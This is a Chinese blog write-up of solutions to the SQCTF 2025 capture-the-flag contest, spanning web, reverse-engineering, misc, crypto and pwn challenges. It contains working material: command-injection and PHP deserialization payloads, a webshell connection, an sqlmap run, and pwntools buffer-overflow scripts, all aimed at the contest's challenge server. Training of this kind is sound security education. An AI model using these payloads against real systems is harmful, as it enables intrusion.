---
title: "商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP"
date: 2025-04-13 19:18:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "SQCTF"
cnblogs_postid: "18823582"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18823582"
---

题目出的挺好的，有梯度而且各类知识点都有，最后也是做了42道，虽然只有193名，大佬特别多，但是感觉自己还蛮厉害的（
# Web

## 1、RceMe

shellcode

```
/?com=nl%20/*
```

## 2、ezGame

发现一个obj

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191158206-153974658.png)


因此用obj.score改分数

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191202312-1922143566.png)


玩输了之后获得flag

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191206337-231893235.png)


## 3、Ping

用管道符发现能执行命令

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191210983-803900900.png)

用1同样的方法获得flag

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191215931-1126226397.png)


## 4、商师一日游

第一关：源代码

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191219992-860160451.png)


第二关：Cookie

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191223951-1354666064.png)


第三关：请求头

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191228565-1592191441.png)


第四关：robots.txt

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191234162-379114448.png)


第五关：

shellcode:```?hhh=php%0Aflag```

第六关：去掉disabled

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191239079-548607046.png)


第七关：shell

蚁剑连接

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191242862-1713953650.png)


这里记得把杀毒软件关掉

获得最后一块

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191247331-1403841158.png)

## 5、小小查询系统

sqlmap秒了

```
sqlmap -u http://challenge.qsnctf.com:30561/?id=1 -a
```

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191253288-1817227.png)

6、大大大黑塔

bv号

```
http://challenge.qsnctf.com:30641/?SQNU=BV1tXckehEd30641
```

随后反序列化

```php
<?php
class Secret {
    public $key;
}
$obj = new Secret();
$obj->key = "SQCTF";
echo serialize($obj);
?>
```

发送

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191258938-2040413222.png)


## 6、Input a number

intval($num,0)函数是多进制判断，尝试了一下用八进制可以

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191305303-971920395.png)


## 7、Ez_calculate

ai写的

```Python
import requests
from bs4 import BeautifulSoup
import re
import time


def solve_math_challenge(url):
    # 创建会话保持连接
    session = requests.Session()

    # 第一次请求获取挑战页面
    start_time = time.time()
    get_response = session.get(url)

    # 解析表达式
    soup = BeautifulSoup(get_response.text, 'html.parser')
    challenge = soup.find('div', class_='challenge').text.strip()

    # 清理非计算字符（保留数字和运算符）
    clean_expr = re.sub(r'[^\d+\-*/()]', '', challenge)

    # 安全计算表达式
    try:
        result = eval(clean_expr)
    except:
        raise ValueError(f"表达式解析失败: {clean_expr}")

    # 构造提交数据（模拟浏览器表单）
    post_data = {
        'value': int(result)  # 强制转换为整数匹配输入框类型
    }

    # 计算请求耗时（模拟人类速度）
    request_delay = time.time() - start_time
    remaining_time = max(0, 2.0 - request_delay)  # 2秒时间限制

    # 提交答案（带随机延迟）
    time.sleep(remaining_time * 0.7)  # 保留0.6秒余量
    post_response = session.post(url, data=post_data)

    return post_response.text


# 使用示例
if __name__ == "__main__":
    target_url = "http://challenge.qsnctf.com:31273/"
    print(solve_math_challenge(target_url))
```

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191315683-1169666859.png)


![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191318554-1345976264.png)


## 8、My Blog

点github获得账号密码

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191322983-410584750.png)


dirsearch获得login.php

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191326688-783191157.png)


输入账号密码获得flag

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191332017-657740249.png)


## 9、baby rce

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191338892-284826250.png)


## 10、eeaassyy

直接开开发人员工具

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191342984-2093165891.png)


## 11、逃

```
/?payload=O:4:"test":2:{s:4:"user";s:4:"test";s:4:"pswd";s:8:"escaping";}
```

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191348260-238056743.png)


12、

flask-unsign

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191354116-749788650.png)


随后输入cookie：session=

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191358314-102654236.png)


导航到/admin获得flag

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191402249-1588982034.png)


# Reverse

## 1、遇事不决，可问春风

找mainactivity，然后问ai获得答案

1. **确定flag长度**：

   - `v9`被设置为15，因此flag长度为15字符。

2. **解析加密数组v6**：

   - ```
     v6
     ```

     由两个64位数值初始化：

     - 第一个值`0xFBF715FA08FD0B0D`分解为小端字节：`0x0D, 0x0B, 0xFD, 0x08, 0xFA, 0x15, 0xF7, 0xFB`。
     - 第二个值`0x0F0E011431130DFB`分解为小端字节：`0xFB, 0x0D, 0x13, 0x31, 0x43, 0x11, 0x0E, 0x0F`。

   - 合并后`v6`的15字节为：`0x0D, 0x0B, 0xFD, 0x08, 0xFA, 0x15, 0xF7, 0xFB, 0x0D, 0x13, 0x31, 0x14, 0x01, 0x0E, 0x0F`。

3. **逆向加密算法**：

   - 加密过程：`(input_char ^ 0xA5) + 55 = v6[i]`。
   - 解密过程：`input_char = (v6[i] - 55) ^ 0xA5`。

4. **逐字节解密**：
   对`v6`的每个字节应用逆向公式：

   - `0x0D → s`, `0x0B → q`, `0xFD → c`, `0x08 → t`, `0xFA → f`, `0x15 → {`, `0xF7 → e`, `0xFB → a`, `0x0D → s`, `0x13 → y`, `0x31 → _`, `0x14 → x`, `0x01 → o`, `0x0E → r`, `0x0F → }`。

**Flag**: `sqctf{easy_xor}`

## 2、春风也有春风愁

```python
hex_str = "7f1f17fd8e51aa660b8036914a4950e8fa8078a2ef33608650fb7a845226f2d1"
data = bytes.fromhex(hex_str)

key = [0x12345678, 0x89ABCDEF, 0xFEDCBA98, 0x76543210]

def decrypt_block(block, key):
    v6 = int.from_bytes(block[:4], 'little')
    v5 = int.from_bytes(block[4:], 'little')
    sum_val = 0xC6EF3720  # Initial sum value
    for _ in range(32):
        # Update v5
        term1 = (v6 + sum_val) & 0xFFFFFFFF
        term2 = ((16 * v6) + key[2]) & 0xFFFFFFFF
        term3 = ((v6 >> 5) + key[3]) & 0xFFFFFFFF
        combined = (term1 ^ term2 ^ term3) & 0xFFFFFFFF
        v5 = (v5 - combined) & 0xFFFFFFFF
        # Update v6
        term1_v6 = (v5 + sum_val) & 0xFFFFFFFF
        term2_v6 = ((16 * v5) + key[0]) & 0xFFFFFFFF
        term3_v6 = ((v5 >> 5) + key[1]) & 0xFFFFFFFF
        combined_v6 = (term1_v6 ^ term2_v6 ^ term3_v6) & 0xFFFFFFFF
        v6 = (v6 - combined_v6) & 0xFFFFFFFF
        # Update sum_val (equivalent to sum -= delta)
        sum_val = (sum_val + 0x61C88647) & 0xFFFFFFFF
    return v6.to_bytes(4, 'little') + v5.to_bytes(4, 'little')

decrypted_data = bytearray()
for i in range(0, len(data), 8):
    block = data[i:i+8]
    decrypted_block = decrypt_block(block, key)
    decrypted_data.extend(decrypted_block)

# Process padding
pad_len = decrypted_data[-1]
decrypted_data = decrypted_data[:-pad_len]

# XOR each byte with 22
flag = bytes([b ^ 22 for b in decrypted_data])

print(flag.decode())
```

## 3、ezRe

先去upx壳，发现图标是pyinstaller的，所以进行exe逆向pyc逆向代码操作

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191432321-287172364.png)


base64解密即可获得flag

## 4、慕然回首，那人却在灯火阑珊处

```puts("xixi Now enter the flag in the format 'sqctf{your_path}':");```提示答案就是路径

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191439511-29474231.png)


根据代码分析地图是8x8的，直接找最短路径就可以获得flag

sqctf{ddsssdssaasssddddddwd}

## 5、鹅鹅鹅，曲项向天歌

python逆向

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191444884-1778485828.png)


```python
def decrypt_flag():
    ciphertext = 'itd~tzw_know_sanmenxbZ8'
    part2_1 = ciphertext[:7]      # 前7个字符
    part2_2 = ciphertext[7:20]    # 中间13个字符
    part2_3 = ciphertext[20:]     # 最后3个字符

    # 逆向操作
    decrypted = ''
    # 前7个字符：加密时+5，解密时-5
    decrypted += ''.join([chr(ord(c) - 5) for c in part2_1])
    # 中间13个字符：加密时+0，保持不变
    decrypted += part2_2
    # 最后3个字符：加密时-7，解密时+7
    decrypted += ''.join([chr(ord(c) + 7) for c in part2_3])

    return f'flag{{{decrypted}}}'

print(decrypt_flag())
```



![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191453346-1773171116.png)

## 7、天下谁人不识君

```Python
s = 'wesyvbniazxchjko1973652048@$+-&*<>'
result = 'v7b3boika$h4h5j0jhkh161h79393i5x010j0y8n$i'

pairs = [(result[i*2], result[i*2+1]) for i in range(len(result)//2)]
flag = ''

for i in range(len(pairs)):
    c1, c2 = pairs[i]
    pos1 = s.index(c1)
    s1 = (pos1 - i) % 34
    pos2 = s.index(c2)
    s2 = (-pos2 - i - 1) % 34
    if s1 > 15 or s2 > 16:
        continue  # 无效情况，但题目保证有解
    ord_char = s1 * 17 + s2
    flag += chr(ord_char)

print(flag)
```

## 8、不劳春风解我忧

发现是xxtea

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191509681-1758498575.png)

```C++
#include <stdio.h>
#include <stdint.h>
#include<iostream>
#define DELTA 0x9e3779b9
#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))
 using namespace std;
void btea(uint32_t *v, int n, uint32_t const key[4])
{
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    if (n > 1)            /* Coding Part */
    {
        rounds = 6 + 52/n;
        sum = 0;
        z = v[n-1];
        do
        {
            sum += DELTA;
            e = (sum >> 2) & 3;
            for (p=0; p<n-1; p++)
            {
                y = v[p+1];
                z = v[p] += MX;
            }
            y = v[0];
            z = v[n-1] += MX;
        }
        while (--rounds);
    }
    else if (n < -1)      /* Decoding Part */
    {
        n = -n;
        rounds = 6 + 52/n;
        sum = rounds*DELTA;
        y = v[0];
        do
        {
            e = (sum >> 2) & 3;
            for (p=n-1; p>0; p--)
            {
                z = v[p-1];
                y = v[p] -= MX;
            }
            z = v[n-1];
            y = v[0] -= MX;
            sum -= DELTA;
        }
        while (--rounds);
    }
}
 
 
int main()
{
    uint32_t v[]= {0x8F748963,0xCB1D96A8};
    uint32_t const k[4]= {0x12345678,0x9ABCDEF0,0xFEDCBA98,0x87654321};
    int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密
    // v为要加密的数据是两个32位无符号整数
    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位
    btea(v, -n, k);
    printf("解密后的数据：%u %u\n",v[0],v[1]);
    for (int i = 0; i < 2; i++ )
		printf("%x ", v[i]);    
    unsigned char * p = (unsigned char *)v;
    for (int i = 0; i < 2; i++ )
    	for (int j = 0; j < 4; j++ )
    		printf("%c", p[i * 4 + j]);
    return 0;
}
```



# Misc

## 1、非人类

频谱图

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191520001-971891134.png)


## 2、love.host

里面藏了一个压缩包，foremost提取获得flag

sqctf{Sun Ensheng is the most handsome.}

## 3、Welcome_Sign_in

扫描二维码


## 6、小巷人家

提示flag是寺庙名字，识图得出

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191541417-1574822969.png)


# Crypto

## 1、base？

cyberchef magic

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191547429-707323290.png)


## 2、密室逃脱的终极挑战

ida秒了

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191551169-647441729.png)


## 3、别阴阳我了行吗？

阴阳怪气编码

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191554815-515543136.png)


## 4、玩的挺变态啊清茶哥

猪圈密码

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191601537-869153856.png)


## 5、简单RSA

factordb分解n

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191605202-554353013.png)

ctfrsatools

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191609089-1501504492.png)


## 6、春风得意马蹄疾

社会主义核心价值观编码

多次解密获得

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191612872-5040477.png)


## 7、ezCRT

```python
from sympy.ntheory.modular import crt
from sympy import integer_nthroot

# 给定参数
n1 = 64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681
n2 = 82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063
n3 = 62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093

c1 = 36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165
c2 = 58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023
c3 = 23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614

# 验证模数互质（此处省略，与之前代码相同）

# 应用CRT解同余方程
moduli = [n1, n2, n3]
remainders = [c1, c2, c3]
x, modulus = crt(moduli, remainders)

# 计算立方根
m, is_perfect_cube = integer_nthroot(x, 3)
if not is_perfect_cube:
    raise ValueError("x不是一个完全立方数，解密失败")

# 将整数明文转换为字节
def int_to_bytes(m_int):
    # 计算整数所需的字节长度
    byte_length = (m_int.bit_length() + 7) // 8
    # 转换为大端字节序的字节数组
    m_bytes = m_int.to_bytes(byte_length, byteorder='big')
    return m_bytes

m_bytes = int_to_bytes(m)

# 尝试UTF-8解码
try:
    plaintext = m_bytes.decode('utf-8')
    print("明文转换为字符串:", plaintext)
except UnicodeDecodeError:
    # 若UTF-8解码失败，转为十六进制字符串
    hex_str = m_bytes.hex()
    print("UTF-8解码失败，转为十六进制:", hex_str)
    # 进一步尝试ASCII字符转换（可选）
    ascii_str = ''.join([chr(b) if 32 <= b < 127 else '.' for b in m_bytes])
    print("ASCII可视字符:", ascii_str)

# 最终输出明文数值和字符
print("\n解密后的明文数值:")
print(m)
```

![image-20250410201655784](G:\知识库\周报合集\4月第2周\sqctf wp.assets\image-20250410201655784.png)

## 8、丢三落四的小I

ctfrsatools

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191622039-646739078.png)


## 9、字母的轮舞与维吉尼亚的交响曲

爆破压缩包密码，是123456

维吉尼亚密码解密

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191626062-343838754.png)


再拿着疑似flag的内容去解密

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191631296-676974031.png)


## 10、Common Modulus

```Python
import gmpy2
from Crypto.Util.number import long_to_bytes

n = 13650503560233612352420237787159267432351878281073422449253560365809461612884248041710373755322100953953257608601227381211434513766352420535096028618735289379355710140356003114010103377509526452574385251495847301426845768427018504464757671958803807138699056193259160806476941875860254288376872925837127208612702688503022494109785623082365323949385021488106289708499091818714253710552213982060745736652306892896670424179736886691685639988637188591805479432332714690818805432648223229601082431517091667297328748597580733946557364100555781113940729296951594110258088501146224322799560159763097710814171619948719257894889
c1 = 3366500968116867439746769272799247895217647639427183907930755074259056811685671593722389247697636905214269760325119955242254171223875159785479900114989812511815466122321484289407596620307636198001794029251197349257235827433633936216505458557830334779187112907940003978773672225479445837897135907447625387990203145231671233038707457396631770623123809080945314083730185110252441203674945146889165953135351824739866177205127986576305492490242804571570833778440870959816207461376598067538653432472043116027057204385251674574207749241503571444801505084599753550983430739025050926400228758055440679102902069032768081393253
c2 = 7412517103990148893766077090616798338451607394614015195336719617426935439456886251056015216979658274633552687461145491779122378237012106236527924733047395907133190110919550491029113699835260675922948775568027483123730185809123757000207476650934095553899548181163223066438602627597179560789761507989925938512977319770704123979102211869834390476278761480516444396187746843654541476645830961891622999425268855097938496239480682176640906218645450399785130931214581370821403077312842724336393674718200919934701268397883415347122906912693921254353511118129903752832950063164459159991128903683711317348665571285175839274346
e1 = 4217054819
e2 = 2800068527

# --------------------- 步骤 1：检查是否存在公因子 ---------------------
gcd1 = gmpy2.gcd(c1, n)
gcd2 = gmpy2.gcd(c2, n)

if gcd1 != 1 or gcd2 != 1:
    # 存在公因子，直接分解 n
    p = gcd1 if gcd1 != 1 else gcd2
    q = n // p
    # 计算私钥 d（任选一个 e 即可，这里用 e1）
    phi = (p-1) * (q-1)
    d = gmpy2.invert(e1, phi)
    m = pow(c1, d, n)
    print("Flag:", long_to_bytes(m).decode())
    exit()

# --------------------- 步骤 2：共模攻击 ---------------------
# 计算扩展欧几里得系数
gcd, a, b = gmpy2.gcdext(e1, e2)
assert gcd == 1, "e1 和 e2 必须互质"

def compute_part(c, exp, n):
    if exp < 0:
        c_inv = gmpy2.invert(c, n)
        return pow(c_inv, -exp, n)
    else:
        return pow(c, exp, n)

part1 = compute_part(c1, a, n)
part2 = compute_part(c2, b, n)

m = (part1 * part2) % n
print("Flag:", long_to_bytes(m).decode())
```

SQCTF{06774dcf-b9d1-3c2d-8917-7d2d86b6721c}

## 11、你的天赋是什么

![image](/assets/cnblogs/商丘师范学院第四届网络安全及信息对抗大赛SQCTF（校外赛）WP/3539156-20250413191639167-1115842727.png)


## 12、《1789年的密文》

很像的题目：https://ctf.bugku.com/challenges/detail/id/56.html

猜测是转轮加密：
按秘钥提示对字符串调整顺序：
POIUYTREWQASDFGHJKLMNBVCXZ
BXZPMTQOIRVHKLSAFUDGJYCEWN 
WSXEDCRFVTGBYHNUJMIKOLPQAZ 
EDCRFVTGBYHNUJMIKOLPQAZWSX
RFVGYBHNUJMIKOLPQAZWSXEDCT
AZQWSXEDCRFVTGBYHNUJMIKOLP
LKJHGFDSAQZWXECRVBYTNUIMOP
MNHBGVCFXDRZESWAQPLOKMIJUY
TGBYHNUJMIKOLPQAZWSXEDCRFV
IKOLPQAZWSXEDCRFVTGBYHNUJM 
QWXZRJYVKSLPDTMACFNOGIEBHU 
ZXCVBNMASDFGHJKLPOIUYTREWQ
YUJIKMOLPQAWSZEXRDCFVGBHNM
VFRCDXESZWAQPLOKMIJNUHGBTG

按密文提示调整每行字符串：
UYTREWQASDFGHJKLMNBVCXZPOI
NBXZPMTQOIRVHKLSAFUDGJYCEW
EDCRFVTGBYHNUJMIKOLPQAZWSX
HNUJMIKOLPQAZWSXEDCRFVTGBY
JMIKOLPQAZWSXEDCTRFVGYBHNU
PAZQWSXEDCRFVTGBYHNUJMIKOL
BYTNUIMOPLKJHGFDSAQZWXECRV
IJUYMNHBGVCFXDRZESWAQPLOKM
UJMIKOLPQAZWSXEDCRFVTGBYHN
OLPQAZWSXEDCRFVTGBYHNUJMIK
MACFNOGIEBHUQWXZRJYVKSLPDT
ASDFGHJKLPOIUYTREWQZXCVBNM
VGBHNMYUJIKMOLPQAWSZEXRDCF
ZWAQPLOKMIJNUHGBTGVFRCDXES

发现倒数第十列为MAKETYSECGREAT，可能符合题意，转为小写maketysecgreat

# Pwn

## 1、浅红欺醉粉，肯信有江梅

nc之后cat flag

## 2、领取你的小猫娘

变量覆盖

```
from pwn import *
p=remote("challenge.qsnctf.com",32184)
p.recvuntil("characters")
payload=b"a"*76+b"1"
p.send(payload)
p.interactive()
```

## 3、江南无所有，聊赠一枝春

栈溢出

```
from pwn import *
p=remote("challenge.qsnctf.com",30440)
p.recvuntil("gift?")
payload=b"a"*(64+8)+p64(0x4011DC)
p.send(payload)
p.interactive()
```

## 4、借的东风破金锁

```Python
from pwn import *

# 设置目标程序
context(arch='amd64', os='linux')
#p = process('./key')  # 替换为实际二进制文件名
p=remote("challenge.qsnctf.com",30530)
# 构造Payload
auth_code = 0x53514e55435446
payload = p64(auth_code)  # 小端打包auth_code
payload += b'A' * 8       # 填充剩余8字节

# 发送Payload
p.sendlineafter(b'Input your key: ', payload)
p.interactive()
```
